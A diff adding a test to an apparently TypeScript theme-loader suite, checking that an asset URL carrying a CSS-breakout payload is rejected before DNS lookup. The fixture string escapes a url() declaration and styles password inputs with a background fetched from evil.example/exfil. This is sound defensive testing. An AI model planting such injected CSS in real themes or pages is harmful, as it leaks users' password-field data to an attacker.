@@ -296,6 +296,29 @@ describe('reloadThemes — AC-5 asset URL SSRF validation', () => {
     expect(getCompiledThemes()[0]?.css).toContain('https://cdn.acme.example/logo.svg')
   })
 
+  it('rejects a CSS-breakout payload smuggled in an otherwise-public HTTPS asset URL (AC-4/AC-5 crossover)', async () => {
+    // Found via adversarial code review: the SSRF check only validates the *hostname*, so a
+    // syntactically valid public URL can still carry a `") } input[type=password]{...}` payload
+    // that would break out of the compiled `url("...")` declaration if interpolated raw.
+    const breakout =
+      'https://cdn.breakout.example/logo.svg") } input[type=password]{background:url("https://evil.example/exfil'
+    const deps = fixtureDeps({
+      'acme.json': {
+        content: JSON.stringify({ name: 'acme', tokens: {}, assets: { logo: breakout } }),
+      },
+    })
+    const dnsLookup = vi.fn(async () => [{ address: '203.0.113.10' }])
+    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
+    expect(result.loaded).toEqual([])
+    expect(result.failed).toEqual([
+      { file: 'acme.json', reason: "asset 'logo': URL contains unsafe characters" },
+    ])
+    // The DNS lookup must never even be reached — the character-safety check rejects the value
+    // before any SSRF resolution is attempted.
+    expect(dnsLookup).not.toHaveBeenCalled()
+    expect(getCompiledThemes()).toEqual([])
+  })
+
   it('rejects an RFC 1918 private-address asset URL', async () => {
     const deps = fixtureDeps({
       'acme.json': {
